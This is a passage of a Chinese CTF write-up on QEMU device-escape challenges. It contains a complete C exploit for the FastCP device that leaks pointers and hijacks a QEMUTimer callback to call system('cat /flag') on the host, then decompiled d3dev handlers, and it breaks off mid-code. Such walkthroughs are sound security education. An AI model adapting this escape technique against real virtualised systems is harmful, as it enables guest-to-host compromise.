title="注意！！"></a><strong>注意！！</strong></h4><p><strong>虽然利用方式特别简单，但是这道题目有一点是非常容易被忽略的。那就是物理地址连续不代表虚拟地址连续！</strong></p><p>在下面exp中，在第一次读取到<code>cp_timer</code>成员到内容后并没有使用<code>*(unsigned long long *)(userbuf + 0x1010)</code>来读取，因为程序中实际写入到函数是<code>cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, 1);</code>而这里写入到的是物理地址，但是物理地址并不连续，所以这里是读取不到的。所以最后往<code>cp_timer</code>成员写入的时候使用的也是<code>va2pa(userbuf + 0x1000) - 0x1000</code>写入。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> CP_src;</span><br><span class="line">    <span class="keyword">uint64_t</span> CP_cnt;</span><br><span class="line">    <span class="keyword">uint64_t</span> CP_dst;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> expire_time;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> timer_list;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cb;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> next;</span><br><span class="line">    <span class="keyword">int</span> attributes;</span><br><span class="line">    <span class="keyword">int</span> scale;</span><br><span class="line">    <span class="keyword">char</span> command[<span class="number">0x50</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_CP_list_cnt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x10</span>)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_CP_list_src</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + <span class="number">8</span>)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> src, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write_CP_list_cnt(cnt);</span><br><span class="line">    write_CP_list_src(src);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x18</span>)) = cmd;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/bus/pci/devices/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x2000</span>);</span><br><span class="line">    phy_userbuf = va2pa(userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff virtual address: %p\n&quot;</span>, userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff physical address: %p\n&quot;</span>, (<span class="keyword">void</span> *)phy_userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span> <span class="title">info</span>;</span></span><br><span class="line">    info.CP_src = <span class="literal">NULL</span>;</span><br><span class="line">    info.CP_dst = phy_userbuf;</span><br><span class="line">    info.CP_cnt = <span class="number">0x1000</span> + <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">4</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    info.CP_src = phy_userbuf + <span class="number">0x1000</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x30</span>;</span><br><span class="line">    info.CP_dst = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">2</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    info.CP_src = <span class="literal">NULL</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x30</span>;</span><br><span class="line">    info.CP_dst = phy_userbuf;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">4</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fastcp_cp_timer=&gt;%p\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x10</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, va2pa(userbuf + <span class="number">0x1000</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, va2pa(userbuf + <span class="number">0x2000</span>));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fastcp_cp_timer = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> elf_base = fastcp_cp_timer - <span class="number">0x4DCE80</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> system_addr = elf_base + <span class="number">0x2C2180</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> opaque_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> <span class="title">timer</span>;</span></span><br><span class="line"></span><br><span class="line">    timer.expire_time = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    timer.timer_list = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x8</span>);</span><br><span class="line">    timer.cb = system_addr;</span><br><span class="line">    timer.opaque = opaque_addr + <span class="number">0x1a30</span>;</span><br><span class="line">    timer.next = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x20</span>);</span><br><span class="line">    timer.attributes = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(userbuf + <span class="number">0x28</span>);</span><br><span class="line">    timer.scale = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(userbuf + <span class="number">0x2c</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;timer.command, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf + <span class="number">0x1000</span>, &amp;timer, <span class="keyword">sizeof</span>(timer));</span><br><span class="line"></span><br><span class="line">    info.CP_src = va2pa(userbuf + <span class="number">0x1000</span>) - <span class="number">0x1000</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x1000</span> + <span class="number">0x30</span> + <span class="number">9</span>;</span><br><span class="line">    info.CP_dst = va2pa(userbuf + <span class="number">0x1000</span>) - <span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x11</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(userbuf + i * <span class="number">0x18</span>, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_cmd(<span class="number">1</span>, phy_userbuf, <span class="number">0x11</span>);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x18</span>)) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230321155543134.png"                      alt="image-20230321155543134"                ></p><h2 id="d3dev"><a href="#d3dev" class="headerlink" title="d3dev"></a>d3dev</h2><p>先看看结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(16))) <span class="title">d3devState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  MemoryRegion_0 pmio;</span><br><span class="line">  <span class="keyword">uint32_t</span> memory_mode;</span><br><span class="line">  <span class="keyword">uint32_t</span> seek;</span><br><span class="line">  <span class="keyword">uint32_t</span> init_flag;</span><br><span class="line">  <span class="keyword">uint32_t</span> mmio_read_part;</span><br><span class="line">  <span class="keyword">uint32_t</span> mmio_write_part;</span><br><span class="line">  <span class="keyword">uint32_t</span> r_seed;</span><br><span class="line">  <span class="keyword">uint64_t</span> blocks[<span class="number">257</span>];</span><br><span class="line">  <span class="keyword">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> (*rand_r)(<span class="keyword">unsigned</span> <span class="keyword">int</span> *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="分析函数"><a href="#分析函数" class="headerlink" title="分析函数"></a>分析函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">d3dev_mmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;blocks[opaque-&gt;seek + (addr &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">  v4 = <span class="number">0xC6EF3720</span>;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  result = HIDWORD(v3);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = result - ((v5 + v4) ^ (opaque-&gt;key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">    v5 -= (result + v4) ^ (opaque-&gt;key[<span class="number">1</span>] + (result &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">    v4 += <span class="number">0x61C88647</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;mmio_read_part )</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mmio_read</code>函数这里，首先是根据seek和addr定位到数据，随后将数据进行tea解密，然后第一次输出低32位，第二次输出高32位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v8; <span class="comment">// r10d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v10; <span class="comment">// r8d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v13; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;seek + (addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      v8 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      v9 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      v10 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      v11 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *(v5 + <span class="number">0x2B6</span>);</span><br><span class="line">      v13 = (v5[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v12 += (v7 + v13) ^ (v9 + (v13 &gt;&gt; <span class="number">5</span>)) ^ (v8 + <span class="number">16</span> * v13);</span><br><span class="line">        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v10 + <span class="number">16</span> * v12)) + v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">0xC6EF3720</span> );</span><br><span class="line">      v5[<span class="number">0x15B</span>] = __PAIR64__(v13, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>mmio_write</code>函数中首先一样先通过seek和addr得到index，第一次使用时是直接在低32位写入输入的数据，后面的则是低32位和高32位进行tea加密随后写入到地址位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> *key; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      